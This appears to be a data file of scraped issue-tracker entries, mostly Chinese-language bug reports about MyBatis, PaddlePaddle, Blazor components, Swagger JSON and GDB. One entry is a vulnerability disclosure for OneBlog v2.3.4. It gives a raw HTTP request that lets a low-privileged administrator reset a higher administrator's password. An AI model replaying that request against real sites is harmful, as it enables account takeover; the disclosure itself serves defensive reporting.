Service中使用当前Service的update方法会报错，错误信息显示Connection is read-only,有个AService 使用AMapper，在AServiceImpl中不论是直接写updateById 还是super.updateById 都提示Connection is read-only. 然后把update的业务逻辑放在controller中 通过aService.updateById 进行修改就可以成功。 在service中进行修改操作的报错信息如下：   <code>: ### Error updating database. Cause: java.sql.SQLException: Connection is read-only. Queries leading to data modification are not allowed ### The error may involve cn.XXX.mapper.OrderInfoMapper.updateById-Inline ### The error occurred while setting parameters at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:957) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:896) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:885) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:860) at com.mysql.jdbc.PreparedStatement.execute(PreparedStatement.java:1138) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:2931) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:2929) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:131) at com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:493) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59) at com.sun.proxy.$Proxy77.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:46) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:63) at com.sun.proxy.$Proxy75.update(Unknown Source) at org.apache.ibatis.executor.ReuseExecutor.doUpdate(ReuseExecutor.java:52) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:434) at com.sun.proxy.$Proxy19.update(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.update(SqlSessionTemplate.java:295) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:62) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:53) at com.sun.proxy.$Proxy36.updateById(Unknown Source) at com.baomidou.framework.service.impl.ServiceImpl.updateById(ServiceImpl.java:186) at com.baomidou.framework.service.impl.ServiceImpl.insertOrUpdate(ServiceImpl.java:110) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:522) at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1095) at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:672) at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.doRun(AprEndpoint.java:2500) at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:2489) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:745)
batch_size 开很大时，CPU 和 GPU 的结果会有少许 diff,"标题：batch_size 开很大时，CPU 和 GPU 的结果会有少许 diff 1）PaddlePaddle版本：1.3.2 2）CPU：Intel(R) Xeon(R) CPU E5-2620 v2 @ 2.10GHz 3）GPU：Tesla K40m、CUDA 8.0 和CUDNN v5.1 4）系统环境：CentOS release 6.3 (Final)，Python 2.7.15 问题描述：batch_size 开很大时，CPU 和 GPU 的结果会有少许 diff 我在跑一个序列标注模型（BiGRU + CRF）的预测时，发现如果让 batch_size=800 或者 1000 这样大的值，CPU 和 GPU 的结果会有稍许 diff，不知道原因是什么。而 batch_size=100 时却没有这个问题，此时 CPU 和 GPU 的结果是一样的。 通过 vimdiff 比较 CPU 和 GPU 的输出 预测代码： utils.py   <code>: if args.do_infer: infer_ret[""pyreader""].start() while True: try: (words, crf_decode, ) = exe.run(infer_program, fetch_list=[ infer_ret[""words""], infer_ret[""crf_decode""], ], return_numpy=False) results = utils.parse_result(words, crf_decode, dataset) for result in results: print(result) except fluid.core.EOFException: infer_ret[""pyreader""].reset() break def parse_result(words, crf_decode, dataset): """""" parse result """""" offset_list = (crf_decode.lod())[0] words = np.array(words) crf_decode = np.array(crf_decode) batch_size = len(offset_list) - 1 batch_out_str = [] for sent_index in range(batch_size): sent_out_str = """" sent_len = offset_list[sent_index + 1] - offset_list[sent_index] for tag_index in range(sent_len): # iterate every word in sent index = tag_index + offset_list[sent_index] cur_word_id = str(words[index][0]) cur_tag_id = str(crf_decode[index][0]) cur_word = dataset.id2word_dict[cur_word_id] cur_tag = dataset.id2label_dict[cur_tag_id] sent_out_str += cur_word + u""/"" + cur_tag + u"" "" sent_out_str = to_str(sent_out_str.strip()) batch_out_str.append(sent_out_str) return batch_out_str"
the output place of cast operator should be the same with input place,"We create global step variable in CPU, and than add a cast operator. If we run the program in GPU, cast operator will have a CUDADeviceContext, and set the output of cast operator in GPU. It will cause segment fault.   <code>: def _decay_step_counter(): # the first global step is zero in learning rate decay global_step = nn.autoincreased_step_counter( counter_name='@LR_DECAY_COUNTER@', begin=0, step=1) global_step = tensor.cast(global_step, 'float32') return global_step"
控制台banner如何修改,|_ <em>| / __'(</em>)<em>| |</em> / | _ | | __ __ ___ | |_ <em>| __ / /| | ( .| |//\ <em>)| | | |</em> /\ / /</em>| |_ _|_<em>._</em>.|___<em>|</em>| _)_<em>.(</em>___ <em>| :: JeeSite V4.1.2 :: ======================================|</em>|========================== 请问后台启动这个如何修改呢？   <code>: 欢迎使用 后台管理系统 V4.1 您当前的版本为社区版，官方网站：http://jeesite.com
添加setStorageSync拦截器不生效,"依旧可以存进缓存   <code>: uni.addInterceptor('setStorageSync', { invoke(args) { return false }, success(res) { console.log(res) }, fail(err) { console.log(err) } }) uni.setStorageSync('test', 6666)"
Table组件EditTemplate中，Block组件无法触发刷新,"Block组件无法在table的EditTemplate中正常使用 代码： table中点击编辑，弹出编辑dialog，切换状态后，无法控制Block内容的隐藏/显示 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;b&gt;正常控制触发&lt;/b&gt; &lt;ValidateForm Model=""@_model1"" OnInvalidSubmit=""((e)=&gt;Task.CompletedTask)"" OnValidSubmit=""((e)=&gt;Task.CompletedTask)""&gt; &lt;div class=""col-sm-6""&gt; &lt;RadioList @bind-Value=""@_model1.Type"" Items=""@_categories"" class=""width-55""&gt;&lt;/RadioList&gt; &lt;/div&gt; &lt;Block OnQueryCondition=""@((name)=&gt;Task.FromResult(_model1.Type == TestEnum.MENU))""&gt; &lt;div&gt;我是组件内容&lt;/div&gt; &lt;/Block&gt; &lt;/ValidateForm&gt; &lt;Table TItem=""TestModel"" Items=""@(Enumerable.Range(1,10).Select(x=&gt;new TestModel()))"" ShowExtendButtons=""true"" ShowToolbar=""true""&gt; &lt;TableColumns&gt; &lt;TableColumn @bind-Field=""@context.Type"" Width=""80""/&gt; &lt;/TableColumns&gt; &lt;EditTemplate&gt; &lt;div class=""row g-3 form-inline""&gt; &lt;b&gt;无法控制触发&lt;/b&gt; &lt;div class=""col-sm-6""&gt; &lt;RadioList @bind-Value=""@context.Type"" Items=""@_categories"" class=""width-55""&gt;&lt;/RadioList&gt; &lt;/div&gt; &lt;Block OnQueryCondition=""@((name)=&gt;Task.FromResult(context.Type == TestEnum.MENU))""&gt; &lt;div&gt;我是组件内容&lt;/div&gt; &lt;/Block&gt; &lt;/div&gt; &lt;div&gt; &lt;b&gt;无法控制触发&lt;/b&gt; &lt;ValidateForm Model=""@_model2"" OnInvalidSubmit=""((e)=&gt;Task.CompletedTask)"" OnValidSubmit=""((e)=&gt;Task.CompletedTask)""&gt; &lt;div class=""col-sm-6""&gt; &lt;RadioList @bind-Value=""@_model2.Type"" Items=""@_categories"" class=""width-55""&gt;&lt;/RadioList&gt; &lt;/div&gt; &lt;Block OnQueryCondition=""@((name)=&gt;Task.FromResult(_model2.Type == TestEnum.MENU))""&gt; &lt;div&gt;我是组件内容&lt;/div&gt; &lt;/Block&gt; &lt;/ValidateForm&gt; &lt;/div&gt; &lt;/EditTemplate&gt; &lt;/Table&gt; @code{ public enum TestEnum { [Description(""目录"")] DIR = 0, [Description(""菜单"")] MENU = 1, [Description(""按钮"")] BTN = 2 } public class TestModel { [DisplayName(""菜单层级"")] [Required] public TestEnum Type { get; set; } = TestEnum.DIR; } private TestModel _model1 = new(); private TestModel _model2 = new(); private IEnumerable&lt;SelectedItem&gt;? _categories; protected override async Task OnInitializedAsync() { await base.OnInitializedAsync(); _categories = typeof(TestEnum).ToSelectList(); } }"
[2.0.5]返回值有引用相同实体.示例值没有全部渲染. 只有第一个实体的示例值.,"完整JSON   <code>: { ""swagger"": ""2.0"", ""info"": { ""title"": ""在线文档"", ""description"": ""在线API文档"", ""termsOfService"": ""https://github.com/996icu/996.ICU/blob/master/LICENSE"", ""version"": ""1.0"", ""contact"": { ""name"": ""linBq"", ""email"": ""526509994@qq.com"" }, ""license"": { ""name"": ""linBq"", ""url"": ""http://www.jfinal.com/user/43453"" } }, ""host"": ""0.0.0.0:8088"", ""basePath"": ""/api"", ""schemes"": [ ""http"", ""https"" ], ""externalDocs"": { ""description"": ""Find out more about Swagger"", ""url"": ""https://swagger.io/"" }, ""definitions"": { ""SwaggerRes"": { ""type"": ""object"", ""title"": ""响应结果"", ""properties"": { ""success"": { ""type"": ""boolean"", ""description"": ""请求状态"" }, ""data"": { ""originalRef"": ""data"", ""$ref"": ""#/definitions/data"", ""description"": ""返回数据"" }, ""errorCode"": { ""type"": ""string"", ""example"": ""-1"", ""description"": ""错误码"" }, ""errorMessage"": { ""type"": ""string"", ""example"": ""错误信息"", ""description"": ""错误信息"" }, ""showType"": { ""type"": ""int"", ""example"": ""2"", ""description"": ""前端错误处理： 0 silent; 1 message.warn; 2 message.error; 4 notification; 9 page"" }, ""traceId"": { ""type"": ""string"", ""example"": ""someid"", ""description"": ""方便后端故障排除：唯一请求ID"" }, ""host"": { ""type"": ""string"", ""example"": ""127.0.0.1"", ""description"": ""当前访问服务器的主机"" } } }, ""DeviceParamBean"": { ""type"": ""object"", ""title"": ""网关附加数据"", ""properties"": { ""vobcId"": { ""type"": ""integer"", ""example"": 1, ""description"": ""车载设备id"" }, ""machineId"": { ""type"": ""integer"", ""example"": 2, ""description"": ""机具id"" }, ""machineStateThreshold"": { ""type"": ""string"", ""example"": ""20"", ""description"": ""农机状态阈值"" }, ""posReportRate"": { ""type"": ""string"", ""example"": ""3"", ""description"": ""轨迹上报频率"" } } }, ""EquipDto"": { ""type"": ""object"", ""title"": ""农机具"", ""properties"": { ""equipId"": { ""type"": ""int"", ""example"": ""11"", ""description"": ""农机具id"" }, ""equipCode"": { ""type"": ""string"", ""example"": ""2009080002"", ""description"": ""农机具号"" }, ""equipTypeId"": { ""type"": ""string"", ""example"": ""2009080002"", ""description"": ""农机具号"" }, ""status"": { ""type"": ""int"", ""example"": ""0"", ""description"": ""状态 0 正常"" }, ""taskWidth"": { ""type"": ""string"", ""example"": ""20"", ""description"": ""作业宽幅"" }, ""pointStateThresholdStart"": { ""type"": ""string"", ""example"": ""40"", ""description"": ""点位状态阈值上限"" }, ""pointStateThresholdEnd"": { ""type"": ""string"", ""example"": ""60"", ""description"": ""点位状态阈值下限"" }, ""createTime"": { ""type"": ""string"", ""example"": ""yyyy-MM-dd HH:mm:ss"", ""description"": ""创建时间"" }, ""updateTime"": { ""type"": ""string"", ""example"": ""yyyy-MM-dd HH:mm:ss"", ""description"": ""创建时间"" }, ""deviceParamBean"": { ""originalRef"": ""DeviceParamBean"", ""$ref"": ""#/definitions/DeviceParamBean"", ""description"": ""网关附加数据"" } } }, ""MachineDto"": { ""type"": ""object"", ""title"": ""农机"", ""properties"": { ""machineName"": { ""type"": ""string"", ""example"": ""1"", ""description"": ""农机id"" }, ""machineStatus"": { ""type"": ""int"", ""example"": ""0"", ""description"": ""农机状态 0正常 -1报废"" }, ""equipDto"": { ""originalRef"": ""EquipDto"", ""$ref"": ""#/definitions/EquipDto"", ""description"": ""农机局"" }, ""equipDtoList"": { ""type"": ""array"", ""items"": { ""originalRef"": ""EquipDto"", ""$ref"": ""#/definitions/EquipDto"" }, ""description"": ""农机局集合"" } } }, ""simple_test6"": { ""type"": ""object"", ""title"": """", ""properties"": { ""resA"": { ""type"": ""string"", ""example"": ""hello word1"", ""description"": ""返回值A"" }, ""resB"": { ""type"": ""string"", ""example"": ""hello word2"", ""description"": ""返回值b"" }, ""equip"": { ""originalRef"": ""EquipDto"", ""$ref"": ""#/definitions/EquipDto"", ""description"": ""农机具信息"" }, ""equipList"": { ""type"": ""array"", ""items"": { ""originalRef"": ""EquipDto"", ""$ref"": ""#/definitions/EquipDto"" }, ""description"": ""农机具集合"" }, ""machine"": { ""originalRef"": ""MachineDto"", ""$ref"": ""#/definitions/MachineDto"", ""description"": ""农机信息"" } } }, ""SwaggerRes?simple_test6?"": { ""type"": ""object"", ""title"": """", ""properties"": { ""success"": { ""type"": ""boolean"", ""description"": ""请求状态"" }, ""data"": { ""originalRef"": ""simple_test6"", ""$ref"": ""#/definitions/simple_test6"", ""description"": ""返回值"" }, ""errorCode"": { ""type"": ""string"", ""example"": ""-1"", ""description"": ""错误码"" }, ""errorMessage"": { ""type"": ""string"", ""example"": ""错误信息"", ""description"": ""错误信息"" }, ""showType"": { ""type"": ""int"", ""example"": ""2"", ""description"": ""前端错误处理： 0 silent; 1 message.warn; 2 message.error; 4 notification; 9 page"" }, ""traceId"": { ""type"": ""string"", ""example"": ""someid"", ""description"": ""方便后端故障排除：唯一请求ID"" }, ""host"": { ""type"": ""string"", ""example"": ""127.0.0.1"", ""description"": ""当前访问服务器的主机"" } } } }, ""securityDefinitions"": { ""token"": { ""type"": ""apiKey"", ""name"": ""token"", ""in"": ""header"" }, ""testPara"": { ""type"": ""apiKey"", ""name"": ""testPara"", ""in"": ""query"" } }, ""tags"": [ { ""name"": ""最简用法"", ""description"": ""/api/simple (SimpleController)"" } ], ""paths"": { ""/simple/test6"": { ""get"": { ""tags"": [ ""最简用法"" ], ""summary"": ""返回值Object嵌套Object"", ""description"": ""递归实现"", ""operationId"": ""get_simple_test6"", ""produces"": [ ""*/*"" ], ""parameters"": [ { ""name"": ""paramA"", ""description"": ""参数a"", ""in"": ""query"", ""type"": ""String"", ""default"": ""1111"", ""required"": false }, { ""name"": ""paramB"", ""description"": ""参数b"", ""in"": ""query"", ""type"": ""String"", ""default"": ""222"", ""required"": false } ], ""responses"": { ""200"": { ""schema"": { ""originalRef"": ""SwaggerRes?simple_test6?"", ""$ref"": ""#/definitions/SwaggerRes?simple_test6?"" }, ""description"": ""请求成功"" }, ""400"": { ""description"": ""服务器不理解请求的语法"" }, ""403"": { ""description"": ""服务器拒绝请求"" }, ""404"": { ""description"": ""服务器找不到请求的网页"" }, ""405"": { ""description"": ""禁用请求中指定的方法"" }, ""500"": { ""description"": ""服务器遇到错误，无法完成请求"" } } } } } }"
scatter求导有问题,"PaddlePaddle 1.4.1 CPU版本 MacOs 如下代码报错，估计是scatter对于update无法求导 错误为   <code>: import paddle.fluid as fluid import numpy as np zeros = fluid.layers.fill_constant(shape=[5, 3], dtype=""float32"", value=0.0) ind = fluid.layers.data(""index"", shape=[2], dtype=""int32"", append_batch_size=False) ori_data = fluid.layers.data(""ori_data"", shape=[2, 5], dtype=""float32"", append_batch_size=False) update = fluid.layers.fc(ori_data, 3, act=""relu"") output = fluid.layers.scatter(zeros, ind, update) pred = fluid.layers.fc(output, 5, act=""softmax"") label = fluid.layers.data(""label"", shape=[5, 1], dtype=""int64"", append_batch_size=False) loss = fluid.layers.cross_entropy(input=pred, label=label) loss = fluid.layers.reduce_mean(loss) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(program=fluid.default_startup_program()) o = np.random.randn(2, 5) o = np.array(o, dtype=""float32"") adam = fluid.optimizer.Adam(learning_rate=0.01) adam.minimize(loss) feed_dict = {""index"": np.array([1, 3], dtype=""int32""), ""label"": np.array([[1], [1], [1], [1], [1]], dtype=""int64""), ""ori_data"": o } ret = exe.run(fluid.default_main_program(), feed=feed_dict, fetch_list=[loss], return_numpy=True) Traceback (most recent call last): File ""paddle_debug.py"", line 22, in &lt;module&gt; adam.minimize(loss) File ""/anaconda2/envs/snorkel/lib/python3.6/site-packages/paddle/fluid/optimizer.py"", line 498, in minimize no_grad_set=no_grad_set) File ""/anaconda2/envs/snorkel/lib/python3.6/site-packages/paddle/fluid/optimizer.py"", line 403, in backward no_grad_set, callbacks) File ""/anaconda2/envs/snorkel/lib/python3.6/site-packages/paddle/fluid/backward.py"", line 518, in append_backward _append_backward_vars_(root_block, fwd_op_num, grad_to_var, grad_info_map) File ""/anaconda2/envs/snorkel/lib/python3.6/site-packages/paddle/fluid/backward.py"", line 354, in _append_backward_vars_ op_desc.infer_shape(block.desc) paddle.fluid.core.EnforceNotMet: Enforce failed. Expected arg_names.size() == 1UL, but received arg_names.size():0 != 1UL:1. Output(X@GRAD) should hold one element, but now it holds 0 at [/home/teamcity/work/ef54dc8a5b211854/paddle/fluid/framework/op_desc.cc:167] PaddlePaddle Call Stacks: 0 0x11acfe454p void paddle::platform::EnforceNotMet::Init&lt;std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; &gt;(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt;, char const*, int) + 628 1 0x11acfe180p paddle::platform::EnforceNotMet::EnforceNotMet(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, char const*, int) + 80 2 0x11ae4bdbfp paddle::framework::CompileTimeInferShapeContext::SetOutputDim(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, paddle::framework::DDim const&amp;) + 319 3 0x11b073d05p paddle::operators::ScatterGradOp::InferShape(paddle::framework::InferShapeContext*) const + 485 4 0x11ae4a888p paddle::framework::OpDesc::InferShape(paddle::framework::BlockDesc const&amp;) const + 1464 5 0x11adbba16p void pybind11::cpp_function::initialize&lt;pybind11::cpp_function::cpp_function&lt;void, paddle::framework::OpDesc, paddle::framework::BlockDesc const&amp;, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::OpDesc::*)(paddle::framework::BlockDesc const&amp;) const, pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::'lambda'(paddle::framework::OpDesc const*, paddle::framework::BlockDesc const&amp;), void, paddle::framework::OpDesc const*, paddle::framework::BlockDesc const&amp;, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void&amp;&amp;, paddle::framework::OpDesc (*)(paddle::framework::BlockDesc const&amp;), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::'lambda'(pybind11::detail::function_call&amp;)::operator()(pybind11::detail::function_call&amp;) const + 198 6 0x11acdf308p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 3400 7 0x10678f5dap _PyCFunction_FastCallDict + 362 8 0x106715e81p _PyObject_FastCallKeywords + 385 9 0x106866688p call_function + 392 10 0x106864111p _PyEval_EvalFrameDefault + 46817 11 0x10686694cp fast_function + 188 12 0x1068665ecp call_function + 236 13 0x106864111p _PyEval_EvalFrameDefault + 46817 14 0x106857869p _PyEval_EvalCodeWithName + 425 15 0x1068669fap fast_function + 362 16 0x1068665ecp call_function + 236 17 0x106864111p _PyEval_EvalFrameDefault + 46817 18 0x106857869p _PyEval_EvalCodeWithName + 425 19 0x1068669fap fast_function + 362 20 0x1068665ecp call_function + 236 21 0x1068641c1p _PyEval_EvalFrameDefault + 46993 22 0x106857869p _PyEval_EvalCodeWithName + 425 23 0x1068669fap fast_function + 362 24 0x1068665ecp call_function + 236 25 0x106864111p _PyEval_EvalFrameDefault + 46817 26 0x106857869p _PyEval_EvalCodeWithName + 425 27 0x1068b00bcp PyRun_FileExFlags + 252 28 0x1068af594p PyRun_SimpleFileExFlags + 372 29 0x1068d61f6p Py_Main + 3766 30 0x106705d19p main + 313 31 0x7fff64399ed9p start + 1 32 0x2p"
当前端html的form表单里name为nodeName时会提示错误信息,"添加操作，form表单中name为nodeName报错，修改成其他的错误消失   <code>: &lt;div class=""form-group""&gt; &lt;label class=""col-sm-3 control-label is-required""&gt;节点名称：&lt;/label&gt; &lt;div class=""col-sm-8""&gt; &lt;input name=""nodeName"" class=""form-control"" type=""text"" required&gt; &lt;/div&gt; &lt;/div&gt;"
There is a Insecure Permissions vulnerability exists in OneBlog v2.3.4,"Current description OneBlog v2.3.4 is vulnerable to insecure privileges. Low-level administrators can reset the passwords of high-level administrators who exceed their permissions. vulnerability recurrence First log in to the background using the low-privileged user admin/123456，This is a low-privileged user   <code>: POST /passport/updatePwd HTTP/1.1 Host: localhost:8085 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 66 Origin: http://localhost:8085 Connection: close Referer: http://localhost:8085/ Cookie: session_user=""93lkCfVDA258ElC3HuO7gUY4xGkEK1BFLktUlzaQ+c8=""; Hm_lvt_1040d081eea13b44d84a4af639640d51=1654896251; pageno_cookie=1; SHIRO_SESSION_ID=47e409dd-e488-4e2f-8a68-42ae7cd2de9c; id=2&amp;password=123456&amp;newPassword=1234567&amp;newPasswordRepeat=1234567 123456 com.zyd.blog.controller.PassportController com.zyd.blog.business.service.impl#updatePwd"
【众智】【计算-用户接口】Combinations,"Combinations functional接口 当with_replacement设置为False时， 行为类似于 python 的itertools.combinations ，当with_replacement设置为True时，它的行为类似于itertools.combinations_with_replacement。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py PyTorch1.8.1接口： torch.combinations https://pytorch.org/docs/stable/generated/torch.combinations.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: def combinations(x: tensor, r: int, with_replacement: bool) -&gt; tensor: return y"
bootstarp-fileinput 控件问题,"我在使用bootstrap-inputfile上传功能，将文件上传到了OumaConfig.getUploadPath()的地址中，标签的话用""/profile/......""+文件地址就能直接调用文件。 我现在要在bootstrap-inputfile控件初始化的时候把已经存在的文件显示出来先， ,bootstrap-inputfile 需要这么写(http://localhost:8080//profile/attach/202002/2020/02/25/49fbc80e32bc66087280877e586a9483.pdf)，才能在预览中显示文件，必须带有 http://localhost:8080访问路径，http://localhost:8080/ 这个访问路径在系统中应该如何获取？ 我现在用js截取访问路径的方式 得到主机地址， 然后拼成 localhostPath+ctx+""/profile/.........""; 这种方式存在什么弊端吗？   <code>: &lt;a&gt; var curWwwPath = window.document.location.href; var pathName = window.document.location.pathname; var pos = curWwwPath.indexOf(pathName); var localhostPath = curWwwPath.substring(0, pos);"
Oops.Bah 返回提示异常,"返回的错误信息 为 ""非Excel格式""   <code>: public IActionResult OnException(ExceptionContext context, ExceptionMetadata metadata) { return new JsonResult(RESTfulResult(metadata.StatusCode, data: metadata.Data, errors: metadata.Errors)); }"
test,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
【GDB dwarf】 enum 类型不支持,"gdb 使用 whatis 查看变量类型，找不到v_misordered的类型   <code>: enum misordered {two = 2, one = 1, zero = 0, three = 3}; enum misordered v_misordered = three; void use (void *p) { } int main () { use (&amp;v_misordered); } (gdb) whatis (@code enum misordered) v_misordered No enum type named misordered."
Jetson AGX Xavier预测错误,"系统信息 PaddlePaddle version: 264e76c (v2.0.0-beta0) OS Platform: Ubuntu 18.04.4 LTS Python version: 3.6.9 CMake version: 3.10.2 GCC version: 7.5.0 CUDA version: 10.2 Device: Jetson AGX Xavier (32G) 安装方式: 本地编译 cmake命令 预测使用模型：PaddleOCR 预测使用代码：链接 报错信息   <code>: cmake .. \ -DWITH_CONTRIB=OFF \ -DWITH_MKL=OFF \ -DWITH_MKLDNN=OFF \ -DWITH_TESTING=OFF \ -DCMAKE_BUILD_TYPE=Release \ -DON_INFER=ON \ -DWITH_PYTHON=ON \ -DWITH_XBYAK=OFF \ -DWITH_NV_JETSON=ON \ -DPY_VERSION=3 \ -DCUDA_ARCH_NAME=Auto make TARGET=ARMV8 -j8 python3 tools/infer/predict_system.py --image_dir=./doc/imgs --det_model_dir=./models/ch_ppocr_server_v1.1_det_infer --rec_model_dir=./models/ch_ppocr_server_v1.1_rec_infer --cls_model_dir=./models/ch_ppocr_mobile_v1.1_cls_infer --use_angle_cls=True --use_space_char=True W1013 21:50:36.225878 8259 analysis_predictor.cc:1042] Deprecated. Please use CreatePredictor instead. -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 cuDevicePrimaryCtxRetain 1 paddle::framework::SignalHandle(char const*, int) 2 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: A serious error (Segmentation fault) is detected by the operating system. (at /home/mingquan-agx/Downloads/Paddle/paddle/fluid/platform/init.cc:303) [TimeInfo: *** Aborted at 1602643836 (unix time) try ""date -d @1602643836"" if you are using GNU date ***] [SignalInfo: *** SIGSEGV (@0x7f7ece8090) received by PID 8259 (TID 0x7f7ed3a010) from PID 2127462544 ***] Segmentation fault (core dumped)"
feature/parallel_gpu,A simple implementation parallel_do supporting multigpu TODO: Correctness init device context https://github.com/PaddlePaddle/Paddle/pull/7345 getPlaceOp https://github.com/PaddlePaddle/Paddle/pull/6732   <code>: ... | ParallelDo | Split input | Copy parameter to multiple GPUs - Wait |||| Forward on multiple GPUs - Wait | Merge output - Wait | ... | ParallelGradDo | Split output@grad - Wait |||| Backward on multiple GPUs - Wait | AllReduce parameters - Wait | ...
如何进行模型字段的排序，且支持泛型？,"springboot版本：2.3.5RELEASE knife4j版本：2.0.7 问题描述 在早期的swagger版本中，通过网上的模型插件可以做到字段按照声明顺序排序，knife4j2.0.2就是依赖springfox2.9.2，没问题。但是knife4j2.0.7依赖的springfox2.10.5改变了依赖的Optional类，从guawa改到JDK自己的。因此插件代码需要调整为如下，结果设计到泛型的响应就无法识别： @citizenl public class CustomApiModelPropertyPositionBuilder implements ModelPropertyBuilderPlugin { }   <code>: private Log log = LogFactory.getLog(getClass()); @Override public boolean supports(DocumentationType delimiter) { return SwaggerPluginSupport.pluginDoesApply(delimiter); } @Override public void apply(ModelPropertyContext context) { java.util.Optional&lt;BeanPropertyDefinition&gt; beanPropertyDefinitionOpt = context.getBeanPropertyDefinition(); java.util.Optional&lt;ApiModelProperty&gt; annotation = java.util.Optional.empty(); if (context.getAnnotatedElement().isPresent()) { annotation = java.util.Optional.of(annotation.orElseGet(ApiModelProperties.findApiModePropertyAnnotation(context.getAnnotatedElement().get())::get)); } if (context.getBeanPropertyDefinition().isPresent()) { annotation = java.util.Optional.of(annotation.orElseGet(findPropertyAnnotation(context.getBeanPropertyDefinition().get(), ApiModelProperty.class)::get)); } if (beanPropertyDefinitionOpt.isPresent()) { BeanPropertyDefinition beanPropertyDefinition = beanPropertyDefinitionOpt.get(); if (annotation.isPresent() &amp;&amp; annotation.get().position() != 0) { return; } AnnotatedField field = beanPropertyDefinition.getField(); Class&lt;?&gt; clazz = field.getDeclaringClass(); Field[] declaredFields = clazz.getDeclaredFields(); Field declaredField; try { declaredField = clazz.getDeclaredField(field.getName()); } catch (NoSuchFieldException | SecurityException e) { log.error("""", e); return; } int indexOf = -1; for (int i = 0; i &lt; declaredFields.length; i++) { if(declaredFields[i].equals(declaredField)) { indexOf = i; break; } } if (indexOf != -1) { context.getBuilder().position(indexOf); } } }"
